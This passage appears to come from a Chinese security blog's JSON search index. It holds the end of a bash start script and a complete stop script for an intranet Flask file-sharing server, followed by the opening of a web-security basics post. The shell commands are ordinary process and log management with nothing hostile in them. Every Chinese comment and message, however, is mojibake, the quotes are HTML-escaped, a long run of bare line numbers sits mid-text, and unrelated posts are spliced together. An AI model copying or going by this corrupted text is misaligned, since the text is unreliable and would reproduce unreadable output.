$LOG_FILE\u0026#34; echo \u0026#34;åœæ­¢æœåŠ¡å™¨: ./stop_server.sh æˆ– kill $PID\u0026#34; exit 0 fi else info \u0026#34;æ¸…ç†æ—§çš„PIDæ–‡ä»¶\u0026#34; rm -f \u0026#34;$PID_FILE\u0026#34; fi fi # å¤‡ä»½æ—§çš„æ—¥å¿— if [ -f \u0026#34;$LOG_FILE\u0026#34; ]; then TIMESTAMP=$(date +%Y%m%d_%H%M%S) mv \u0026#34;$LOG_FILE\u0026#34; \u0026#34;logs/server_${TIMESTAMP}.log\u0026#34; 2\u0026gt;/dev/null || true info \u0026#34;å·²å¤‡ä»½æ—§æ—¥å¿—: logs/server_${TIMESTAMP}.log\u0026#34; fi if [ -f \u0026#34;$ERROR_FILE\u0026#34; ]; then TIMESTAMP=$(date +%Y%m%d_%H%M%S) mv \u0026#34;$ERROR_FILE\u0026#34; \u0026#34;logs/error_${TIMESTAMP}.log\u0026#34; 2\u0026gt;/dev/null || true info \u0026#34;å·²å¤‡ä»½æ—§é”™è¯¯æ—¥å¿—: logs/error_${TIMESTAMP}.log\u0026#34; fi # å¯åŠ¨æœåŠ¡å™¨ info \u0026#34;æ­£åœ¨å¯åŠ¨æœåŠ¡å™¨ï¼ˆç«¯å£: 10000ï¼‰...\u0026#34; echo \u0026#34;å¯åŠ¨æ—¶é—´: $(date)\u0026#34; \u0026gt; \u0026#34;$LOG_FILE\u0026#34; echo \u0026#34;å¯åŠ¨ç›®å½•: $(pwd)\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; echo \u0026#34;Pythonç‰ˆæœ¬: $(python3 --version)\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; echo \u0026#34;Flaskç‰ˆæœ¬: $FLASK_VERSION\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; echo \u0026#34;è¿è¡Œç«¯å£: 10000\u0026#34; \u0026gt;\u0026gt; \u0026#34;$LOG_FILE\u0026#34; # åœ¨åå°å¯åŠ¨æœåŠ¡å™¨ info \u0026#34;å¯åŠ¨å‘½ä»¤: python3 app.py\u0026#34; nohup python3 app.py \u0026gt; \u0026#34;$LOG_FILE\u0026#34; 2\u0026gt;\u0026#34;$ERROR_FILE\u0026#34; \u0026amp; SERVER_PID=$! # ä¿å­˜PID echo $SERVER_PID \u0026gt; \u0026#34;$PID_FILE\u0026#34; info \u0026#34;æœåŠ¡å™¨è¿›ç¨‹ID: $SERVER_PID\u0026#34; # ç­‰å¾…æœåŠ¡å™¨å¯åŠ¨ info \u0026#34;ç­‰å¾…æœåŠ¡å™¨å¯åŠ¨ï¼ˆæœ€å¤šç­‰å¾…10ç§’ï¼‰...\u0026#34; for i in {1..10}; do if ps -p \u0026#34;$SERVER_PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then # æ£€æŸ¥ç«¯å£æ˜¯å¦åœ¨ç›‘å¬ if ss -tuln 2\u0026gt;/dev/null | grep -q \u0026#34;:10000 \u0026#34; || netstat -tuln 2\u0026gt;/dev/null | grep -q \u0026#34;:10000 \u0026#34;; then success \u0026#34;æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç«¯å£10000æ­£åœ¨ç›‘å¬\u0026#34; break fi if [ $i -eq 10 ]; then warning \u0026#34;æœåŠ¡å™¨è¿›ç¨‹åœ¨è¿è¡Œï¼Œä½†ç«¯å£10000æœªç›‘å¬\u0026#34; else echo -n \u0026#34;.\u0026#34; sleep 1 fi else error \u0026#34;æœåŠ¡å™¨è¿›ç¨‹å·²é€€å‡º\u0026#34; break fi done echo \u0026#34;\u0026#34; # æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å¯åŠ¨æˆåŠŸ if ps -p \u0026#34;$SERVER_PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then success \u0026#34;âœ… æœåŠ¡å™¨å¯åŠ¨æˆåŠŸ!\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; æœåŠ¡å™¨ä¿¡æ¯\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; PID: $SERVER_PID\u0026#34; echo \u0026#34; çŠ¶æ€: è¿è¡Œä¸­\u0026#34; echo \u0026#34; ç«¯å£: 10000\u0026#34; echo \u0026#34; æ—¥å¿—æ–‡ä»¶: $LOG_FILE\u0026#34; echo \u0026#34; é”™è¯¯æ—¥å¿—: $ERROR_FILE\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; è®¿é—®åœ°å€\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; æœ¬åœ°è®¿é—®: http://127.0.0.1:10000\u0026#34; if [ \u0026#34;$IP_ADDRESSES\u0026#34; != \u0026#34;æ— æ³•è·å–IP\u0026#34; ]; then echo \u0026#34; å±€åŸŸç½‘è®¿é—®:\u0026#34; for ip in $IP_ADDRESSES; do echo \u0026#34; http://$ip:10000\u0026#34; done fi echo \u0026#34;\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; ç®¡ç†å‘½ä»¤\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; æŸ¥çœ‹å®æ—¶æ—¥å¿—: tail -f $LOG_FILE\u0026#34; echo \u0026#34; æŸ¥çœ‹é”™è¯¯æ—¥å¿—: tail -f $ERROR_FILE\u0026#34; echo \u0026#34; åœæ­¢æœåŠ¡å™¨: ./stop_server.sh æˆ– kill $SERVER_PID\u0026#34; echo \u0026#34; é‡å¯æœåŠ¡å™¨: ./restart_server.sh\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; æ–‡ä»¶ç›®å½•\u0026#34; echo \u0026#34;========================================\u0026#34; echo \u0026#34; ä¸Šä¼ ç›®å½•: $(pwd)/uploads/\u0026#34; echo \u0026#34; ä¸‹è½½ç›®å½•: $(pwd)/downloads/\u0026#34; echo \u0026#34; æ—¥å¿—ç›®å½•: $(pwd)/logs/\u0026#34; echo \u0026#34;\u0026#34; # å°è¯•è·å–æœåŠ¡å™¨ä¿¡æ¯ info \u0026#34;æµ‹è¯•æœåŠ¡å™¨è¿æ¥...\u0026#34; if command -v curl \u0026amp;\u0026gt; /dev/null; then if curl -s -o /dev/null -w \u0026#34;%{http_code}\u0026#34; http://127.0.0.1:10000 2\u0026gt;/dev/null | grep -q \u0026#34;200\\|30\u0026#34;; then success \u0026#34;æœåŠ¡å™¨å“åº”æ­£å¸¸\u0026#34; else warning \u0026#34;æœåŠ¡å™¨å“åº”å¼‚å¸¸ï¼Œè¯·æ£€æŸ¥æ—¥å¿—\u0026#34; fi else warning \u0026#34;æœªæ‰¾åˆ°curlï¼Œè·³è¿‡è¿æ¥æµ‹è¯•\u0026#34; fi # æ˜¾ç¤ºæœ€åå‡ è¡Œæ—¥å¿— info \u0026#34;æœ€è¿‘æ—¥å¿—:\u0026#34; if [ -f \u0026#34;$LOG_FILE\u0026#34; ] \u0026amp;\u0026amp; [ -s \u0026#34;$LOG_FILE\u0026#34; ]; then tail -10 \u0026#34;$LOG_FILE\u0026#34; else echo \u0026#34;æ—¥å¿—æ–‡ä»¶ä¸ºç©º\u0026#34; fi else error \u0026#34;âŒ æœåŠ¡å™¨å¯åŠ¨å¤±è´¥\u0026#34; error \u0026#34;è¯·æ£€æŸ¥æ—¥å¿—æ–‡ä»¶: $LOG_FILE\u0026#34; error \u0026#34;é”™è¯¯æ—¥å¿—: $ERROR_FILE\u0026#34; # æ˜¾ç¤ºé”™è¯¯æ—¥å¿— if [ -f \u0026#34;$ERROR_FILE\u0026#34; ] \u0026amp;\u0026amp; [ -s \u0026#34;$ERROR_FILE\u0026#34; ]; then echo \u0026#34;\u0026#34; echo \u0026#34;é”™è¯¯ä¿¡æ¯:\u0026#34; tail -20 \u0026#34;$ERROR_FILE\u0026#34; else echo \u0026#34;é”™è¯¯æ—¥å¿—æ–‡ä»¶ä¸ºç©º\u0026#34; fi rm -f \u0026#34;$PID_FILE\u0026#34; # æ£€æŸ¥ç«¯å£æ˜¯å¦è¢«å ç”¨ if ss -tuln 2\u0026gt;/dev/null | grep -q \u0026#34;:10000 \u0026#34; || netstat -tuln 2\u0026gt;/dev/null | grep -q \u0026#34;:10000 \u0026#34;; then warning \u0026#34;ç«¯å£10000å¯èƒ½å·²è¢«å…¶ä»–è¿›ç¨‹å ç”¨\u0026#34; info \u0026#34;æŸ¥çœ‹å ç”¨ç«¯å£çš„è¿›ç¨‹:\u0026#34; if command -v lsof \u0026amp;\u0026gt; /dev/null; then sudo lsof -i :10000 || echo \u0026#34;æ— æ³•æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ\u0026#34; elif command -v fuser \u0026amp;\u0026gt; /dev/null; then sudo fuser 10000/tcp || echo \u0026#34;æ— æ³•æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ\u0026#34; fi fi exit 1 fi # ä¿æŒè„šæœ¬è¿è¡Œï¼ˆå¯é€‰ï¼‰ echo \u0026#34;\u0026#34; read -p \u0026#34;æŒ‰å›è½¦é”®é€€å‡ºï¼Œæˆ–è¾“å…¥ \u0026#39;l\u0026#39; æŸ¥çœ‹å®æ—¶æ—¥å¿—: \u0026#34; -n 1 -r echo if [[ $REPLY =~ ^[Ll]$ ]]; then echo \u0026#34;å¼€å§‹æŸ¥çœ‹å®æ—¶æ—¥å¿— (Ctrl+C é€€å‡º)...\u0026#34; tail -f \u0026#34;$LOG_FILE\u0026#34; fi exit 0 stop.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 #!/bin/bash # æ–‡ä»¶å…±äº«ç³»ç»ŸæœåŠ¡ç»“æŸè„šæœ¬ # ä½¿ç”¨æ–¹æ³•: ./stop.sh [é€‰é¡¹] set -e # å‡ºé”™æ—¶åœæ­¢æ‰§è¡Œ echo \u0026#34;========================================\u0026#34; echo \u0026#34; å†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿ - æœåŠ¡ç»“æŸè„šæœ¬\u0026#34; echo \u0026#34;========================================\u0026#34; # å®šä¹‰é¢œè‰²è¾“å‡º RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; YELLOW=\u0026#39;\\033[1;33m\u0026#39; BLUE=\u0026#39;\\033[0;34m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color # è¾“å‡ºå¸¦é¢œè‰²çš„æ¶ˆæ¯ info() { echo -e \u0026#34;${BLUE}[INFO]${NC} $1\u0026#34; } success() { echo -e \u0026#34;${GREEN}[SUCCESS]${NC} $1\u0026#34; } warning() { echo -e \u0026#34;${YELLOW}[WARNING]${NC} $1\u0026#34; } error() { echo -e \u0026#34;${RED}[ERROR]${NC} $1\u0026#34; } # æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ show_help() { echo \u0026#34;ç”¨æ³•: $0 [é€‰é¡¹]\u0026#34; echo \u0026#34;é€‰é¡¹:\u0026#34; echo \u0026#34; -h, --help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯\u0026#34; echo \u0026#34; -f, --force å¼ºåˆ¶åœæ­¢ï¼ˆä½¿ç”¨kill -9ï¼‰\u0026#34; echo \u0026#34; -s, --status ä»…æ˜¾ç¤ºæœåŠ¡å™¨çŠ¶æ€ï¼Œä¸åœæ­¢\u0026#34; echo \u0026#34; -v, --verbose æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯\u0026#34; echo \u0026#34; -a, --all åœæ­¢æ‰€æœ‰ç›¸å…³è¿›ç¨‹ï¼ˆåŒ…æ‹¬å­è¿›ç¨‹ï¼‰\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;ç¤ºä¾‹:\u0026#34; echo \u0026#34; $0 æ­£å¸¸åœæ­¢æœåŠ¡å™¨\u0026#34; echo \u0026#34; $0 -f å¼ºåˆ¶åœæ­¢æœåŠ¡å™¨\u0026#34; echo \u0026#34; $0 -s ä»…æŸ¥çœ‹æœåŠ¡å™¨çŠ¶æ€\u0026#34; echo \u0026#34; $0 -v -f å¼ºåˆ¶åœæ­¢å¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯\u0026#34; } # è·å–è„šæœ¬æ‰€åœ¨ç›®å½• SCRIPT_DIR=\u0026#34;$( cd \u0026#34;$( dirname \u0026#34;${BASH_SOURCE[0]}\u0026#34; )\u0026#34; \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; pwd )\u0026#34; cd \u0026#34;$SCRIPT_DIR\u0026#34; # è§£æå‘½ä»¤è¡Œå‚æ•° FORCE=false STATUS_ONLY=false VERBOSE=false STOP_ALL=false while [[ $# -gt 0 ]]; do case $1 in -h|--help) show_help exit 0 ;; -f|--force) FORCE=true shift ;; -s|--status) STATUS_ONLY=true shift ;; -v|--verbose) VERBOSE=true shift ;; -a|--all) STOP_ALL=true shift ;; *) error \u0026#34;æœªçŸ¥é€‰é¡¹: $1\u0026#34; echo \u0026#34;ä½¿ç”¨ $0 -h æŸ¥çœ‹å¸®åŠ©\u0026#34; exit 1 ;; esac done # æ–‡ä»¶è·¯å¾„ PID_FILE=\u0026#34;server.pid\u0026#34; LOG_FILE=\u0026#34;logs/server.log\u0026#34; ERROR_FILE=\u0026#34;logs/error.log\u0026#34; # æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯çš„å‡½æ•° verbose_info() { if [ \u0026#34;$VERBOSE\u0026#34; = true ]; then info \u0026#34;$1\u0026#34; fi } # æ£€æŸ¥PIDæ–‡ä»¶æ˜¯å¦å­˜åœ¨ check_pid_file() { if [ ! -f \u0026#34;$PID_FILE\u0026#34; ]; then if [ \u0026#34;$STATUS_ONLY\u0026#34; = false ]; then warning \u0026#34;æœªæ‰¾åˆ°PIDæ–‡ä»¶: $PID_FILE\u0026#34; fi return 1 fi PID=$(cat \u0026#34;$PID_FILE\u0026#34; 2\u0026gt;/dev/null) if [ -z \u0026#34;$PID\u0026#34; ] || [[ ! \u0026#34;$PID\u0026#34; =~ ^[0-9]+$ ]]; then warning \u0026#34;PIDæ–‡ä»¶å†…å®¹æ— æ•ˆ\u0026#34; return 1 fi return 0 } # æ˜¾ç¤ºæœåŠ¡å™¨çŠ¶æ€ show_status() { echo \u0026#34;========================================\u0026#34; echo \u0026#34; æœåŠ¡å™¨çŠ¶æ€\u0026#34; echo \u0026#34;========================================\u0026#34; # æ£€æŸ¥PIDæ–‡ä»¶ if check_pid_file; then if ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then echo \u0026#34; âœ… æœåŠ¡å™¨æ­£åœ¨è¿è¡Œ\u0026#34; echo \u0026#34; PID: $PID\u0026#34; # è·å–è¿›ç¨‹è¯¦ç»†ä¿¡æ¯ if command -v ps \u0026amp;\u0026gt; /dev/null; then PROCESS_INFO=$(ps -p \u0026#34;$PID\u0026#34; -o pid,ppid,user,cmd --no-headers 2\u0026gt;/dev/null || echo \u0026#34;æ— æ³•è·å–è¿›ç¨‹ä¿¡æ¯\u0026#34;) echo \u0026#34; è¿›ç¨‹ä¿¡æ¯:\u0026#34; echo \u0026#34; $PROCESS_INFO\u0026#34; fi # æ£€æŸ¥ç«¯å£å ç”¨ info \u0026#34;æ£€æŸ¥ç«¯å£å ç”¨æƒ…å†µ...\u0026#34; if command -v ss \u0026amp;\u0026gt; /dev/null; then PORT_INFO=$(sudo ss -tulpn 2\u0026gt;/dev/null | grep \u0026#34;:10000 \u0026#34; || echo \u0026#34;ç«¯å£æœªæ‰¾åˆ°æˆ–æ²¡æœ‰æƒé™\u0026#34;) elif command -v netstat \u0026amp;\u0026gt; /dev/null; then PORT_INFO=$(sudo netstat -tulpn 2\u0026gt;/dev/null | grep \u0026#34;:10000 \u0026#34; || echo \u0026#34;ç«¯å£æœªæ‰¾åˆ°æˆ–æ²¡æœ‰æƒé™\u0026#34;) else PORT_INFO=\u0026#34;æ— æ³•æ£€æŸ¥ç«¯å£ï¼ˆè¯·å®‰è£…ssæˆ–netstatï¼‰\u0026#34; fi echo \u0026#34; ç«¯å£10000çŠ¶æ€:\u0026#34; echo \u0026#34; $PORT_INFO\u0026#34; # æ˜¾ç¤ºå¯åŠ¨æ—¶é—´ if [ -f \u0026#34;$LOG_FILE\u0026#34; ]; then START_TIME=$(grep \u0026#34;å¯åŠ¨æ—¶é—´:\u0026#34; \u0026#34;$LOG_FILE\u0026#34; | head -1 | cut -d: -f2-) if [ -n \u0026#34;$START_TIME\u0026#34; ]; then echo \u0026#34; å¯åŠ¨æ—¶é—´:$START_TIME\u0026#34; fi fi # æ˜¾ç¤ºæ—¥å¿—æ–‡ä»¶å¤§å° if [ -f \u0026#34;$LOG_FILE\u0026#34; ]; then LOG_SIZE=$(du -h \u0026#34;$LOG_FILE\u0026#34; 2\u0026gt;/dev/null | cut -f1 || echo \u0026#34;æœªçŸ¥\u0026#34;) echo \u0026#34; æ—¥å¿—å¤§å°: $LOG_SIZE\u0026#34; fi return 0 else echo \u0026#34; âŒ æœåŠ¡å™¨æœªè¿è¡Œï¼ˆPIDæ–‡ä»¶å­˜åœ¨ä½†è¿›ç¨‹ä¸å­˜åœ¨ï¼‰\u0026#34; echo \u0026#34; PID: $PID\u0026#34; return 1 fi else # æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–ç›¸å…³è¿›ç¨‹ info \u0026#34;æ£€æŸ¥æ˜¯å¦æœ‰ç›¸å…³è¿›ç¨‹åœ¨è¿è¡Œ...\u0026#34; RELATED_PIDS=$(ps aux | grep -E \u0026#34;python.*app\\.py|flask\u0026#34; | grep -v grep | awk \u0026#39;{print $2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39;) if [ -n \u0026#34;$RELATED_PIDS\u0026#34; ]; then echo \u0026#34; âš ï¸ å‘ç°ç›¸å…³è¿›ç¨‹ï¼ˆä½†ä¸æ˜¯é€šè¿‡æœ¬è„šæœ¬å¯åŠ¨ï¼‰\u0026#34; echo \u0026#34; ç›¸å…³è¿›ç¨‹PID: $RELATED_PIDS\u0026#34; echo \u0026#34; è¿›ç¨‹è¯¦æƒ…:\u0026#34; for pid in $RELATED_PIDS; do ps -p \u0026#34;$pid\u0026#34; -o pid,user,cmd --no-headers 2\u0026gt;/dev/null || true done return 2 else echo \u0026#34; âŒ æœåŠ¡å™¨æœªè¿è¡Œ\u0026#34; return 3 fi fi } # åœæ­¢æœåŠ¡å™¨ stop_server() { if ! check_pid_file; then # å°è¯•æŸ¥æ‰¾ç›¸å…³è¿›ç¨‹ info \u0026#34;å°è¯•æŸ¥æ‰¾æ–‡ä»¶å…±äº«ç›¸å…³è¿›ç¨‹...\u0026#34; PYTHON_PIDS=$(ps aux | grep -E \u0026#34;python.*app\\.py\u0026#34; | grep -v grep | awk \u0026#39;{print $2}\u0026#39;) if [ -z \u0026#34;$PYTHON_PIDS\u0026#34; ]; then success \u0026#34;æ²¡æœ‰æ‰¾åˆ°æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶å…±äº«æœåŠ¡å™¨\u0026#34; return 0 fi warning \u0026#34;æœªæ‰¾åˆ°PIDæ–‡ä»¶ï¼Œä½†å‘ç°ç›¸å…³è¿›ç¨‹: $PYTHON_PIDS\u0026#34; read -p \u0026#34;æ˜¯å¦åœæ­¢è¿™äº›è¿›ç¨‹? (y/N): \u0026#34; -n 1 -r echo if [[ ! $REPLY =~ ^[Yy]$ ]]; then info \u0026#34;æ“ä½œå·²å–æ¶ˆ\u0026#34; return 0 fi # åœæ­¢æ‰€æœ‰æ‰¾åˆ°çš„è¿›ç¨‹ STOPPED_COUNT=0 for pid in $PYTHON_PIDS; do info \u0026#34;åœæ­¢è¿›ç¨‹ $pid...\u0026#34; if kill $pid 2\u0026gt;/dev/null; then verbose_info \u0026#34;å·²å‘é€åœæ­¢ä¿¡å·åˆ°è¿›ç¨‹ $pid\u0026#34; STOPPED_COUNT=$((STOPPED_COUNT + 1)) else warning \u0026#34;æ— æ³•åœæ­¢è¿›ç¨‹ $pid\u0026#34; fi done # ç­‰å¾…è¿›ç¨‹ç»“æŸ info \u0026#34;ç­‰å¾…è¿›ç¨‹ç»“æŸ...\u0026#34; for i in {1..5}; do REMAINING=$(ps aux | grep -E \u0026#34;python.*app\\.py\u0026#34; | grep -v grep | wc -l) if [ \u0026#34;$REMAINING\u0026#34; -eq 0 ]; then break fi sleep 1 done # æ£€æŸ¥æ˜¯å¦è¿˜æœ‰è¿›ç¨‹è¿è¡Œ REMAINING_PIDS=$(ps aux | grep -E \u0026#34;python.*app\\.py\u0026#34; | grep -v grep | awk \u0026#39;{print $2}\u0026#39;) if [ -n \u0026#34;$REMAINING_PIDS\u0026#34; ] \u0026amp;\u0026amp; [ \u0026#34;$FORCE\u0026#34; = true ]; then warning \u0026#34;è¿˜æœ‰è¿›ç¨‹åœ¨è¿è¡Œï¼Œå°è¯•å¼ºåˆ¶åœæ­¢...\u0026#34; for pid in $REMAINING_PIDS; do if kill -9 \u0026#34;$pid\u0026#34; 2\u0026gt;/dev/null; then verbose_info \u0026#34;å·²å¼ºåˆ¶åœæ­¢è¿›ç¨‹ $pid\u0026#34; fi done fi success \u0026#34;å·²åœæ­¢ $STOPPED_COUNT ä¸ªè¿›ç¨‹\u0026#34; return 0 fi # æ­£å¸¸æƒ…å†µï¼šæœ‰PIDæ–‡ä»¶ if ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then info \u0026#34;æ­£åœ¨åœæ­¢æœåŠ¡å™¨ (PID: $PID)...\u0026#34; # å…ˆå°è¯•æ­£å¸¸åœæ­¢ if kill \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null; then verbose_info \u0026#34;å·²å‘é€åœæ­¢ä¿¡å·åˆ°è¿›ç¨‹ $PID\u0026#34; # ç­‰å¾…è¿›ç¨‹ç»“æŸ info \u0026#34;ç­‰å¾…æœåŠ¡å™¨åœæ­¢ï¼ˆæœ€å¤š10ç§’ï¼‰...\u0026#34; for i in {1..10}; do if ! ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then break fi if [ \u0026#34;$i\u0026#34; -eq 5 ]; then info \u0026#34;æœåŠ¡å™¨ä»åœ¨è¿è¡Œï¼Œç»§ç»­ç­‰å¾…...\u0026#34; fi sleep 1 done else warning \u0026#34;æ— æ³•å‘é€åœæ­¢ä¿¡å·åˆ°è¿›ç¨‹ $PID\u0026#34; FORCE=true fi # æ£€æŸ¥æ˜¯å¦è¿˜éœ€è¦å¼ºåˆ¶åœæ­¢ if ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then if [ \u0026#34;$FORCE\u0026#34; = true ]; then warning \u0026#34;æœåŠ¡å™¨ä»åœ¨è¿è¡Œï¼Œå°è¯•å¼ºåˆ¶åœæ­¢...\u0026#34; if kill -9 \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null; then success \u0026#34;å·²å¼ºåˆ¶åœæ­¢æœåŠ¡å™¨ (PID: $PID)\u0026#34; else error \u0026#34;æ— æ³•å¼ºåˆ¶åœæ­¢æœåŠ¡å™¨\u0026#34; return 1 fi else warning \u0026#34;æœåŠ¡å™¨ä»åœ¨è¿è¡Œï¼Œè¯·ä½¿ç”¨ -f é€‰é¡¹å¼ºåˆ¶åœæ­¢\u0026#34; read -p \u0026#34;æ˜¯å¦å¼ºåˆ¶åœæ­¢? (y/N): \u0026#34; -n 1 -r echo if [[ $REPLY =~ ^[Yy]$ ]]; then if kill -9 \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null; then success \u0026#34;å·²å¼ºåˆ¶åœæ­¢æœåŠ¡å™¨ (PID: $PID)\u0026#34; else error \u0026#34;æ— æ³•å¼ºåˆ¶åœæ­¢æœåŠ¡å™¨\u0026#34; return 1 fi else info \u0026#34;æ“ä½œå·²å–æ¶ˆ\u0026#34; return 0 fi fi else success \u0026#34;æœåŠ¡å™¨å·²æ­£å¸¸åœæ­¢ (PID: $PID)\u0026#34; fi # æ¸…ç†PIDæ–‡ä»¶ if [ -f \u0026#34;$PID_FILE\u0026#34; ]; then rm -f \u0026#34;$PID_FILE\u0026#34; verbose_info \u0026#34;å·²åˆ é™¤PIDæ–‡ä»¶: $PID_FILE\u0026#34; fi # å¦‚æœéœ€è¦ï¼Œåœæ­¢æ‰€æœ‰ç›¸å…³è¿›ç¨‹ if [ \u0026#34;$STOP_ALL\u0026#34; = true ]; then info \u0026#34;æŸ¥æ‰¾å¹¶åœæ­¢æ‰€æœ‰ç›¸å…³å­è¿›ç¨‹...\u0026#34; CHILD_PIDS=$(pgrep -P \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null || echo \u0026#34;\u0026#34;) if [ -n \u0026#34;$CHILD_PIDS\u0026#34; ]; then for child_pid in $CHILD_PIDS; do kill \u0026#34;$child_pid\u0026#34; 2\u0026gt;/dev/null \u0026amp;\u0026amp; verbose_info \u0026#34;å·²åœæ­¢å­è¿›ç¨‹: $child_pid\u0026#34; done fi fi else warning \u0026#34;æœåŠ¡å™¨æœªè¿è¡Œï¼ˆPIDæ–‡ä»¶å­˜åœ¨ä½†è¿›ç¨‹ä¸å­˜åœ¨ï¼‰\u0026#34; # æ¸…ç†æ— æ•ˆçš„PIDæ–‡ä»¶ if [ -f \u0026#34;$PID_FILE\u0026#34; ]; then rm -f \u0026#34;$PID_FILE\u0026#34; info \u0026#34;å·²æ¸…ç†æ— æ•ˆçš„PIDæ–‡ä»¶\u0026#34; fi fi return 0 } # ä¸»é€»è¾‘ if [ \u0026#34;$STATUS_ONLY\u0026#34; = true ]; then show_status exit $? fi # æ˜¾ç¤ºå½“å‰çŠ¶æ€ show_status echo \u0026#34;\u0026#34; # ç¡®è®¤æ“ä½œ if [ \u0026#34;$FORCE\u0026#34; = false ]; then if check_pid_file \u0026amp;\u0026amp; ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then read -p \u0026#34;ç¡®å®šè¦åœæ­¢æœåŠ¡å™¨å—? (y/N): \u0026#34; -n 1 -r echo if [[ ! $REPLY =~ ^[Yy]$ ]]; then info \u0026#34;æ“ä½œå·²å–æ¶ˆ\u0026#34; exit 0 fi fi fi # æ‰§è¡Œåœæ­¢æ“ä½œ if stop_server; then echo \u0026#34;\u0026#34; success \u0026#34;âœ… æ“ä½œå®Œæˆ\u0026#34; # æ˜¾ç¤ºæœ€ç»ˆçŠ¶æ€ if [ \u0026#34;$VERBOSE\u0026#34; = true ]; then echo \u0026#34;\u0026#34; show_status fi else error \u0026#34;âŒ åœæ­¢æœåŠ¡å™¨æ—¶å‡ºé”™\u0026#34; exit 1 fi exit 0 ","date":"2026-01-12T16:58:42+08:00","image":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/cover_hu_6a510bd223ebb8ac.png","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"ã€æ”»é˜²å®è·µã€‘åŸºç¡€ç¯å¢ƒæ­å»º"},{"content":"Webå®‰å…¨åŸºç¡€ ç›®å½• Webå‘å±•å² é™æ€é¡µé¢ä¸åŠ¨æ€é¡µé¢ URLï¼ˆURL Uniform Resource Locatorï¼‰ HTMLåŸºç¡€ HTMLç®€ä»‹ HTMLæ ‡ç­¾/å…ƒç´  HTTPä¸HTTPS HTTP HTTPS Webå‘å±•å² Web1.0ï¼šä¸ªäººç½‘ç«™ï¼Œé—¨æˆ·ç½‘ç»œç­‰ï¼ˆwww.163.comã€www.souhu.comï¼‰ã€‚Web 1.0æ—¶ä»£å¼€å§‹äº1994å¹´ï¼Œå…¶ä¸»è¦ç‰¹å¾æ˜¯å¤§é‡ä½¿ç”¨é™æ€çš„ HTML 